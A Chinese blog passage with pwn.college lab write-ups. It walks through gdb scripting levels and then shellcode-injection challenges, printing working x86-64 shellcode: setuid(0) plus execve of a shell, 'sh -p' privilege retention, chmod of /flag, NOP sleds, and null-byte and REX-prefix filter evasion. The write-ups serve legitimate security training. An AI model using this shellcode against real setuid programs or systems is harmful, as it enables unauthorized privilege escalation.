values displayed to you at all times. There are</span><br><span class="line">multiple ways to do this. The simplest way is to use the `display/&lt;n&gt;&lt;u&gt;&lt;f&gt;` parameterized command, which follows</span><br><span class="line">exactly the same format as the `x/&lt;n&gt;&lt;u&gt;&lt;f&gt;` parameterized command. For example, `display/8i $rip` will always show you</span><br><span class="line">the next 8 instructions. On the other hand, `display/4gx $rsp` will always show you the first 4 values on the stack.</span><br><span class="line">Another option is to use the `layout regs` command. This will put gdb into its TUI mode and show you the contents of all</span><br><span class="line">of the registers, as well as nearby instructions.</span><br><span class="line"></span><br><span class="line">In order to solve this level, you must figure out a series of random values which will be placed on the stack. You are</span><br><span class="line">highly encouraged to try using combinations of `stepi`, `nexti`, `break`, `continue`, and `finish` to make sure you have</span><br><span class="line">a good internal understanding of these commands. The commands are all absolutely critical to navigating a program&#x27;s</span><br><span class="line">execution.</span><br></pre></td></tr></table></figure>

<p><code>si&lt;n&gt;</code>向前推进一条指令</p>
<p><code>ni&lt;n&gt;</code>向前推进一条指令(跳过函数调用)</p>
<p><code>finish</code>来结束当前执行的函数</p>
<p><code>break *&lt;address&gt;</code>在指定地址断点</p>
<p><code>continue</code>继续运行程序直到遇到断点</p>
<p><code>display/&lt;n&gt;&lt;u&gt;&lt;f&gt;</code>用于始终显示某些值</p>
<p>多次level3，只需要在read处断点，持续查看$rbp-0x18内存即可</p>
<h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">We write code in order to express an idea which can be reproduced and refined. We can think of our analysis as a program</span><br><span class="line">which injests the target to be analyzed as data. As the saying goes, code is data and data is code.</span><br><span class="line"></span><br><span class="line">While using gdb interactively as we&#x27;ve done with the past levels is incredibly powerful, another powerful tool is gdb</span><br><span class="line">scripting. By scripting gdb, you can very quickly create a custom-tailored program analysis tool. If you know how to</span><br><span class="line">interact with gdb, you already know how to write a gdb script--the syntax is exactly the same. You can write your</span><br><span class="line">commands to some file, for example `x.gdb`, and then launch gdb using the flag `-x &lt;PATH_TO_SCRIPT&gt;`. This file will</span><br><span class="line">execute all of the gdb commands after gdb launches. Alternatively, you can execute individual commands with `-ex</span><br><span class="line">&#x27;&lt;COMMAND&gt;&#x27;`. You can pass multiple commands with multiple `-ex` arguments. Finally, you can have some commands be</span><br><span class="line">always executed for any gdb session by putting them in `~/.gdbinit`. You probably want to put `set disassembly-flavor</span><br><span class="line">intel` in there.</span><br><span class="line"></span><br><span class="line">Within gdb scripting, a very powerful construct is breakpoint commands. Consider the following gdb script:</span><br><span class="line"></span><br><span class="line">  start</span><br><span class="line">  break *main+42</span><br><span class="line">  commands</span><br><span class="line">    x/gx $rbp-0x32</span><br><span class="line">    continue</span><br><span class="line">  end</span><br><span class="line">  continue</span><br><span class="line"></span><br><span class="line">In this case, whenever we hit the instruction at `main+42`, we will output a particular local variable and then continue</span><br><span class="line">execution.</span><br><span class="line"></span><br><span class="line">Now consider a similar, but slightly more advanced script using some commands you haven&#x27;t yet seen:</span><br><span class="line"></span><br><span class="line">  start</span><br><span class="line">  break *main+42</span><br><span class="line">  commands</span><br><span class="line">    silent</span><br><span class="line">    set $local_variable = *(unsigned long long*)($rbp-0x32)</span><br><span class="line">    printf &quot;Current value: %llx\n&quot;, $local_variable</span><br><span class="line">    continue</span><br><span class="line">  end</span><br><span class="line">  continue</span><br><span class="line"></span><br><span class="line">In this case, the `silent` indicates that we want gdb to not report that we have hit a breakpoint, to make the output a</span><br><span class="line">bit cleaner. Then we use the `set` command to define a variable within our gdb session, whose value is our local</span><br><span class="line">variable. Finally, we output the current value using a formatted string.</span><br><span class="line"></span><br><span class="line">Use gdb scripting to help you collect the random values.</span><br></pre></td></tr></table></figure>

<p>本关直接要求写一个gdb脚本</p>
<p>对于这样一个gdb脚本来说 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start</span><br><span class="line"> break *main+42</span><br><span class="line"> commands</span><br><span class="line">   x/gx $rbp-0x32</span><br><span class="line">   continue</span><br><span class="line"> end</span><br><span class="line"> continue</span><br></pre></td></tr></table></figure>

<p>每当我们到达断点时，gdb都会帮我们执行命令，然后继续执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start</span><br><span class="line">break *main+42</span><br><span class="line">commands</span><br><span class="line">  silent</span><br><span class="line">  set $local_variable = *(unsigned long long*)($rbp-0x32)</span><br><span class="line">  printf &quot;Current value: %llx\n&quot;, $local_variable</span><br><span class="line">  continue</span><br><span class="line">end</span><br><span class="line">continue</span><br></pre></td></tr></table></figure>

<p>这是一个更高级的脚本，silent表示我们不希望gdb报告到达断点，以便于输出更清晰</p>
<p>依旧是收集随机值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start</span><br><span class="line">break *main+709</span><br><span class="line">commands</span><br><span class="line">  silent</span><br><span class="line">  set $local_variable = *(unsigned long long*)($rbp-0x18)</span><br><span class="line">  printf &quot;Current value: %llx\n&quot;, $local_variable</span><br><span class="line">  continue</span><br><span class="line">end</span><br><span class="line">continue</span><br></pre></td></tr></table></figure>

<p>多次手动输入即可</p>
<h1 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">As it turns out, gdb has FULL control over the target process. Not only can you analyze the program&#x27;s state, but you can</span><br><span class="line">also modify it. While gdb probably isn&#x27;t the best tool for doing long term maintenance on a program, sometimes it can be</span><br><span class="line">useful to quickly modify the behavior of your target process in order to more easily analyze it.</span><br><span class="line"></span><br><span class="line">You can modify the state of your target program with the `set` command. For example, you can use `set $rdi = 0` to zero</span><br><span class="line">out $rdi. You can use `set *((uint64_t *) $rsp) = 0x1234` to set the first value on the stack to 0x1234. You can use</span><br><span class="line">`set *((uint16_t *) 0x31337000) = 0x1337` to set 2 bytes at 0x31337000 to 0x1337.</span><br><span class="line"></span><br><span class="line">Suppose your target is some networked application which reads from some socket on fd 42. Maybe it would be easier for</span><br><span class="line">the purposes of your analysis if the target instead read from stdin. You could achieve something like that with the</span><br><span class="line">following gdb script:</span><br><span class="line"></span><br><span class="line">  start</span><br><span class="line">  catch syscall read</span><br><span class="line">  commands</span><br><span class="line">    silent</span><br><span class="line">    if ($rdi == 42)</span><br><span class="line">      set $rdi = 0</span><br><span class="line">    end</span><br><span class="line">    continue</span><br><span class="line">  end</span><br><span class="line">  continue</span><br><span class="line"></span><br><span class="line">This example gdb script demonstrates how you can automatically break on system calls, and how you can use conditions</span><br><span class="line">within your commands to conditionally perform gdb commands.</span><br><span class="line"></span><br><span class="line">In the previous level, your gdb scripting solution likely still required you to copy and paste your solutions. This</span><br><span class="line">time, try to write a script that doesn&#x27;t require you to ever talk to the program, and instead automatically solves each</span><br><span class="line">challenge by correctly modifying registers / memory.</span><br></pre></td></tr></table></figure>

<p>本关提示我们不手动地复制粘贴，本来是想修改scanf的rdi，但后来有个更好的方法，</p>
<p>使用<code>disassemble win</code>反编译win函数，直接运行win的时候即可获取flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start</span><br><span class="line">break *main+572</span><br><span class="line">commands</span><br><span class="line">  silent</span><br><span class="line">  set $rip=*main+720</span><br><span class="line">  continue</span><br><span class="line">end</span><br><span class="line">continue</span><br></pre></td></tr></table></figure>

<p>当调用read的时候，修改rip为win，改变程序控制流</p>
<h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from /challenge/embryogdb_level7...</span><br><span class="line">(No debugging symbols found in /challenge/embryogdb_level7)</span><br><span class="line">(gdb) run</span><br><span class="line">Starting program: /challenge/embryogdb_level7 </span><br><span class="line">###</span><br><span class="line">### Welcome to /challenge/embryogdb_level7!</span><br><span class="line">###</span><br><span class="line"></span><br><span class="line">GDB is a very powerful dynamic analysis tool which you can use in order to understand the state of a program throughout</span><br><span class="line">its execution. You will become familiar with some of gdb&#x27;s capabilities in this module.</span><br><span class="line"></span><br><span class="line">As we demonstrated in the previous level, gdb has FULL control over the target process. Under normal circumstances, gdb</span><br><span class="line">running as your regular user cannot attach to a privileged process. This is why gdb isn&#x27;t a massive security issue which</span><br><span class="line">would allow you to just immediately solve all the levels. Nevertheless, gdb is still an extremely powerful tool.</span><br><span class="line"></span><br><span class="line">Running within this elevated instance of gdb gives you elevated control over the entire system. To clearly demonstrate</span><br><span class="line">this, see what happens when you run the command `call (void)win()`. As it turns out, all of the levels in this module</span><br><span class="line">can be solved in this way.</span><br><span class="line"></span><br><span class="line">GDB is very powerful!</span><br></pre></td></tr></table></figure>



<p>本关也是提示了，该模块的所有level均可用<code>call (void)win()</code>来完成，本关也是要这样完成</p>
<p><code>GDB IS VERY POWERFUL!</code></p>
<h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting program: /challenge/embryogdb_level8 </span><br><span class="line">###</span><br><span class="line">### Welcome to /challenge/embryogdb_level8!</span><br><span class="line">###</span><br><span class="line"></span><br><span class="line">GDB is a very powerful dynamic analysis tool which you can use in order to understand the state of a program throughout</span><br><span class="line">its execution. You will become familiar with some of gdb&#x27;s capabilities in this module.</span><br><span class="line"></span><br><span class="line">As we demonstrated in the previous level, gdb has FULL control over the target process. Under normal circumstances, gdb</span><br><span class="line">running as your regular user cannot attach to a privileged process. This is why gdb isn&#x27;t a massive security issue which</span><br><span class="line">would allow you to just immediately solve all the levels. Nevertheless, gdb is still an extremely powerful tool.</span><br><span class="line"></span><br><span class="line">Running within this elevated instance of gdb gives you elevated control over the entire system. To clearly demonstrate</span><br><span class="line">this, see what happens when you run the command `call (void)win()`.</span><br><span class="line"></span><br><span class="line">Note that this will _not_ get you the flag (it seems that we broke the win function!), so you&#x27;ll need to work a bit</span><br><span class="line">harder to get this flag!</span><br><span class="line"></span><br><span class="line">As it turns out, all of the levels other levels in module could be solved in this way.</span><br><span class="line"></span><br><span class="line">GDB is very powerful!</span><br></pre></td></tr></table></figure>

<p>本关还是提示要<code>call (void)win()</code>, 但是不能直接获取flag，关卡破坏了win函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00006049ee426951 &lt;+0&gt;:     endbr64 </span><br><span class="line">0x00006049ee426955 &lt;+4&gt;:     push   %rbp</span><br><span class="line">0x00006049ee426956 &lt;+5&gt;:     mov    %rsp,%rbp</span><br><span class="line">0x00006049ee426959 &lt;+8&gt;:     sub    $0x10,%rsp</span><br><span class="line">0x00006049ee42695d &lt;+12&gt;:    movq   $0x0,-0x8(%rbp)</span><br><span class="line">0x00006049ee426965 &lt;+20&gt;:    mov    -0x8(%rbp),%rax</span><br><span class="line">0x00006049ee426969 &lt;+24&gt;:    mov    (%rax),%eax</span><br><span class="line">0x00006049ee42696b &lt;+26&gt;:    lea    0x1(%rax),%edx</span><br><span class="line">0x00006049ee42696e &lt;+29&gt;:    mov    -0x8(%rbp),%rax</span><br><span class="line">0x00006049ee426972 &lt;+33&gt;:    mov    %edx,(%rax)</span><br><span class="line">0x00006049ee426974 &lt;+35&gt;:    lea    0x73e(%rip),%rdi        # 0x6049ee4270b9</span><br><span class="line">0x00006049ee42697b &lt;+42&gt;:    callq  0x6049ee426180 &lt;puts@plt&gt;</span><br><span class="line">0x00006049ee426980 &lt;+47&gt;:    mov    $0x0,%esi</span><br><span class="line">0x00006049ee426985 &lt;+52&gt;:    lea    0x749(%rip),%rdi        # 0x6049ee4270d5</span><br><span class="line">0x00006049ee42698c &lt;+59&gt;:    mov    $0x0,%eax</span><br><span class="line">0x00006049ee426991 &lt;+64&gt;:    callq  0x6049ee426240 &lt;open@plt&gt;</span><br><span class="line">0x00006049ee426996 &lt;+69&gt;:    mov    %eax,0x26a4(%rip)        # 0x6049ee429040 &lt;flag_fd.5712&gt;</span><br><span class="line">0x00006049ee42699c &lt;+75&gt;:    mov    0x269e(%rip),%eax        # 0x6049ee429040 &lt;flag_fd.5712&gt;</span><br><span class="line">0x00006049ee4269a2 &lt;+81&gt;:    test   %eax,%eax</span><br><span class="line">0x00006049ee4269a4 &lt;+83&gt;:    jns    0x6049ee4269ef &lt;win+158&gt;</span><br><span class="line">0x00006049ee4269a6 &lt;+85&gt;:    callq  0x6049ee426170 &lt;__errno_location@plt&gt;</span><br><span class="line">0x00006049ee4269ab &lt;+90&gt;:    mov    (%rax),%eax</span><br><span class="line">0x00006049ee4269ad &lt;+92&gt;:    mov    %eax,%edi</span><br><span class="line">0x00006049ee4269af &lt;+94&gt;:    callq  0x6049ee426270 &lt;strerror@plt&gt;</span><br><span class="line">0x00006049ee4269b4 &lt;+99&gt;:    mov    %rax,%rsi</span><br><span class="line">0x00006049ee4269b7 &lt;+102&gt;:   lea    0x722(%rip),%rdi        # 0x6049ee4270e0</span><br><span class="line">0x00006049ee4269be &lt;+109&gt;:   mov    $0x0,%eax</span><br><span class="line">0x00006049ee4269c3 &lt;+114&gt;:   callq  0x6049ee4261c0 &lt;printf@plt&gt;</span><br><span class="line">0x00006049ee4269c8 &lt;+119&gt;:   callq  0x6049ee4261f0 &lt;geteuid@plt&gt;</span><br><span class="line">0x00006049ee4269cd &lt;+124&gt;:   test   %eax,%eax</span><br><span class="line">0x00006049ee4269cf &lt;+126&gt;:   je     0x6049ee426a66 &lt;win+277&gt;</span><br><span class="line">0x00006049ee4269d5 &lt;+132&gt;:   lea    0x734(%rip),%rdi        # 0x6049ee427110</span><br><span class="line">0x00006049ee4269dc &lt;+139&gt;:   callq  0x6049ee426180 &lt;puts@plt&gt;</span><br><span class="line">0x00006049ee4269e1 &lt;+144&gt;:   lea    0x750(%rip),%rdi        # 0x6049ee427138</span><br><span class="line">0x00006049ee4269e8 &lt;+151&gt;:   callq  0x6049ee426180 &lt;puts@plt&gt;</span><br><span class="line">0x00006049ee4269ed &lt;+156&gt;:   jmp    0x6049ee426a66 &lt;win+277&gt;</span><br><span class="line">0x00006049ee4269ef &lt;+158&gt;:   mov    0x264b(%rip),%eax        # 0x6049ee429040 &lt;flag_fd.5712&gt;</span><br><span class="line">0x00006049ee4269f5 &lt;+164&gt;:   mov    $0x100,%edx</span><br><span class="line">0x00006049ee4269fa &lt;+169&gt;:   lea    0x265f(%rip),%rsi        # 0x6049ee429060 &lt;flag.5711&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00006049ee42695d &lt;+12&gt;:    movq   $0x0,-0x8(%rbp)</span><br></pre></td></tr></table></figure>

<p>win在这里将rbp-0x8赋值给0x0，很明显的错误，跳转到win+47，从这里开始执行open文件，之后会读入flag并输出</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>pwn-college</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode-injection</title>
    <url>/2024/10/11/pwn-college-shellcode-injection/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -nostdlib -static shell.s -o shellcode</span><br></pre></td></tr></table></figure>

<p>不链接库，静态编译出shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objcopy --dump-section .text=shellcode-raw shellcode</span><br></pre></td></tr></table></figure>

<p>从shellcode中提取代码段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat shellcode-raw | /challenge/babyshell_level?</span><br></pre></td></tr></table></figure>

<p>将shellcode注入到level中</p>
<p>若是执行&#x2F;bin&#x2F;sh则要</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat shellcode-raw - | /challenge/babyshell_level?</span><br></pre></td></tr></table></figure>

<p><code>shellcraft.pushstr_array()</code>用法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode = asm(shellcraft.pushstr_array(&quot;rdi&quot;,&quot;/bin/sh -p&quot;))</span><br></pre></td></tr></table></figure>

<p>生成将&#x2F;bin&#x2F;sh -p放入rdi的汇编</p>
<h1 id="level1-无过滤"><a href="#level1-无过滤" class="headerlink" title="level1 无过滤"></a>level1 无过滤</h1><p>本关对输入的shellcode无过滤，长度可达0x1000字节</p>
<p>那基本上是随便过了</p>
<p>但尝试直接execve(“&#x2F;bin&#x2F;sh”,null,null)却不能获取flag，当suid程序执行sh或是bash时，他们会将eUID(进程UID)转换为rUID(真实UID)</p>
<p>有很多条路可走</p>
<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>直接使用suid程序读取flag并输出</p>
<p>可以自己手动汇编，也可以用pwntools快速实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#直接调用cat读取，它的利用是open()-&gt;sendfileto()</span><br><span class="line">shellcraft.cat(&quot;/flag&quot;)</span><br><span class="line"></span><br><span class="line">#用open、read、write：</span><br><span class="line">shellcode = shellcraft.open(&#x27;/flag&#x27;)</span><br><span class="line">shellcode += shellcraft.read(&#x27;rax&#x27;,&#x27;rsp&#x27;,100)</span><br><span class="line">shellcode += shellcraft.write(1,&#x27;rsp&#x27;,100)</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>execve(“/bin/sh&quot;,null,null)</code>不可行，但是<code>execve(&#39;/bin///sh&#39;, [&#39;sh&#39;,&#39;-p&#39;], 0) </code>可以bypass</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcraft.execve(&#x27;sh&#x27;,[&#x27;sh&#x27;,&#x27;-p&#x27;])</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    mov rdi,0</span><br><span class="line">    mov rax,0x69</span><br><span class="line">    syscall  # setuid(0)</span><br><span class="line"></span><br><span class="line">    mov rax, 0x3b         </span><br><span class="line">    lea rdi, [rip+binsh]  </span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0        </span><br><span class="line">    syscall</span><br><span class="line">binsh:</span><br><span class="line">    .string &quot;/bin/sh&quot;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>直接使用<code>setuid(0)</code>提权，然后使用<code>execve(&quot;/bin/sh&quot;,null,null)</code></p>
<h2 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h2><p>是的，还可以使用chmod来让flag文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">    mov rax, 90          </span><br><span class="line">    lea rdi, [rip+flag]  </span><br><span class="line">    mov rsi, 0x1A4        </span><br><span class="line">    syscall</span><br><span class="line">flag:</span><br><span class="line">    .string &quot;/flag&quot;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hacker@shellcode-injection~level1:~/shellcode-injection$cat /flag</span><br><span class="line">pwn.college&#123;wIbsbWRzQ_OiMO-9h_gi8L5e2B7.01NxIDLwgDMzEzW&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-rw-r--r--    1 root root   57 Oct 11 02:08 flag</span><br></pre></td></tr></table></figure>

<h1 id="level2-nop滑行"><a href="#level2-nop滑行" class="headerlink" title="level2 nop滑行"></a>level2 nop滑行</h1><p>shellcraft的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#encoding=utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27; , os = &#x27;linux&#x27;)</span><br><span class="line">shellcode = asm(&quot;nop&quot;)*0x700</span><br><span class="line">shellcode += asm(shellcraft.execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;,&#x27;-p&#x27;], envp=0))	#sh的shellcode</span><br><span class="line">sh=process(f&quot;/challenge/babyshell_level2&quot;)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>宏指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rept 0x800</span><br><span class="line">nop</span><br><span class="line">.endr</span><br><span class="line">shellcode</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#encoding=utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27; , os = &#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">    .rept 0x800</span><br><span class="line">    nop</span><br><span class="line">    .endr</span><br><span class="line"></span><br><span class="line">    mov rdi,0</span><br><span class="line">    mov rax,0x69</span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    mov rax, 0x3b         </span><br><span class="line">    lea rdi, [rip+binsh]  </span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0        </span><br><span class="line">    syscall</span><br><span class="line">binsh:</span><br><span class="line">    .string &quot;/bin/sh&quot;</span><br><span class="line">    </span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">#shellcode += asm(shellcraft.execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;,&#x27;-p&#x27;], envp=0))	#sh的shellcode</span><br><span class="line">sh=process(f&quot;/challenge/babyshell_level2&quot;)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="level3-禁止NULL"><a href="#level3-禁止NULL" class="headerlink" title="level3 禁止NULL"></a>level3 禁止NULL</h1><p>使用shellcraft可以一把梭</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -d ./shellcode</span><br><span class="line"></span><br><span class="line">./shellcode:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:       48 c7 c7 00 00 00 00    mov    $0x0,%rdi</span><br><span class="line">  401007:       48 c7 c0 69 00 00 00    mov    $0x69,%rax</span><br><span class="line">  40100e:       0f 05                   syscall</span><br><span class="line">  401010:       48 c7 c0 3b 00 00 00    mov    $0x3b,%rax</span><br><span class="line">  401017:       48 8d 3d 10 00 00 00    lea    0x10(%rip),%rdi        # 40102e &lt;binsh&gt;</span><br><span class="line">  40101e:       48 c7 c6 00 00 00 00    mov    $0x0,%rsi</span><br><span class="line">  401025:       48 c7 c2 00 00 00 00    mov    $0x0,%rdx</span><br><span class="line">  40102c:       0f 05                   syscall</span><br><span class="line"></span><br><span class="line">000000000040102e &lt;binsh&gt;:</span><br><span class="line">  40102e:       2f                      (bad)</span><br><span class="line">  40102f:       62                      (bad)</span><br><span class="line">  401030:       69                      .byte 0x69</span><br><span class="line">  401031:       6e                      outsb  %ds:(%rsi),(%dx)</span><br><span class="line">  401032:       2f                      (bad)</span><br><span class="line">  401033:       73 68                   jae    40109d &lt;binsh+0x6f&gt;</span><br></pre></td></tr></table></figure>

<p>使用objdump可以看出我们编译的shellcode中有很多00，一大部分是高位寄存器为00，同时还有因为要移动binsh</p>
<p>这次采用orw</p>
<p>难点在于如何把&#x2F;flag完整地送入rdi中，可以采用移位或者异或，两种都使用堆栈</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    #open(&quot;/flag&quot;)</span><br><span class="line">    xor rax,rax</span><br><span class="line">    mov rax, 0x67616c66</span><br><span class="line">    shl rax,8</span><br><span class="line">    mov al, 0x2f</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    push 0x2</span><br><span class="line">    pop rax</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,rax</span><br><span class="line">    xor eax,eax</span><br><span class="line">    xor edx,edx</span><br><span class="line">    mov dh,0x1 #rdx=0x100</span><br><span class="line">    mov rsi,rsp</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    push 0x1</span><br><span class="line">    pop rdi</span><br><span class="line">    xor edx,edx</span><br><span class="line">    mov dh,0x1</span><br><span class="line">    mov rsi,rsp</span><br><span class="line">    push 0x1</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里是移位的方法</p>
<h1 id="level4-禁止REX前缀"><a href="#level4-禁止REX前缀" class="headerlink" title="level4 禁止REX前缀"></a>level4 禁止REX前缀</h1><p>本关禁止了<code>&#39;H&#39;</code>字节，即0x48，事实上，他禁用的是REX前缀，当我们对64位寄存器进行mov，xor等操作时，就会有0x48字节码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">40100a:       48 31 f6                xor    %rsi,%rsi</span><br></pre></td></tr></table></figure>

<p>但是对push和pop并不会有影响</p>
<p>所以考虑使用push，pop来进行寄存器控制</p>
<p>同时，对于eax等32位寄存器使用mov，xor等命令不会有0x48</p>
<p>这里首先是一个orw的shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    	</span><br><span class="line">    lea edi,[eip+flag]    </span><br><span class="line">    push 0x2</span><br><span class="line">    pop rax</span><br><span class="line">    xor esi,esi</span><br><span class="line">    xor edx,edx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov edi,eax</span><br><span class="line">    xor eax,eax</span><br><span class="line">    xor edx,edx</span><br><span class="line">    mov dh,0x1 #rdx=0x100</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    push 0x1</span><br><span class="line">    pop rdi</span><br><span class="line">    xor edx,edx</span><br><span class="line">    mov dh,0x1</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    push 0x1</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">flag: .ascii &quot;/flag&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里读入&#x2F;flag也可以用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov byte ptr [rsp], &#x27;/&#x27;</span><br><span class="line">   mov byte ptr [rsp+1], &#x27;f&#x27;</span><br><span class="line">   mov byte ptr [rsp+2], &#x27;l&#x27;</span><br><span class="line">   mov byte ptr [rsp+3], &#x27;a&#x27;</span><br><span class="line">   mov byte ptr [rsp+4], &#x27;g&#x27;</span><br><span class="line">   xor cl,cl</span><br><span class="line">   mov byte ptr [rsp+5],cl </span><br><span class="line">   push rsp</span><br><span class="line">   pop rdi</span><br></pre></td></tr></table></figure>

<p>然后又是<code>execve(&quot;/bin//sh&quot;,[&#39;/bin//sh&#39;,&#39;-p],null)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    push 0x0 #与栈上残余数据分割</span><br><span class="line">	</span><br><span class="line">	#先将/bin送入栈上，再修改栈上内存实现将/bin/sh放入栈上</span><br><span class="line">    push 0x6e69622f </span><br><span class="line">    mov dword ptr [rsp+4],0x68732f2f</span><br><span class="line">    push rsp</span><br><span class="line">    #将/bin/sh的指针压入栈上</span><br><span class="line">    #指针给rdi</span><br><span class="line">    pop rdi #/bin#sh</span><br><span class="line">	</span><br><span class="line">    push 0x702d # -p</span><br><span class="line"></span><br><span class="line">    push rsp # addr of p</span><br><span class="line">    pop rdx # 便于构造参数列表 </span><br><span class="line">    push 0 # 参数列表的结束</span><br><span class="line">    push rdx # 参数列表的第二项</span><br><span class="line">    push rdi # 参数列表第一项</span><br><span class="line">    push rsp # 参数列表</span><br><span class="line">    pop rsi</span><br><span class="line">    </span><br><span class="line">    push 0</span><br><span class="line">    pop rdx</span><br><span class="line">    push 0x3b</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<h1 id="level-5-禁止系统调用"><a href="#level-5-禁止系统调用" class="headerlink" title="level 5 禁止系统调用"></a>level 5 禁止系统调用</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This challenge requires that your shellcode does not have any `syscall`, &#x27;sysenter&#x27;, or `int` instructions. System calls</span><br><span class="line">are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05</span><br><span class="line">(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to</span><br><span class="line">insert the `syscall` instructions at runtime.</span><br></pre></td></tr></table></figure>

<p>本关禁止了syscall，sysenter，int等指令</p>
<p>但是也给了个提示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">One way to evade this is to have your shellcode modify itself to insert the `syscall` instructions at runtime.</span><br></pre></td></tr></table></figure>

<p>运行程序时插入syscall</p>
<p>先用objdump看一下基础exp</p>
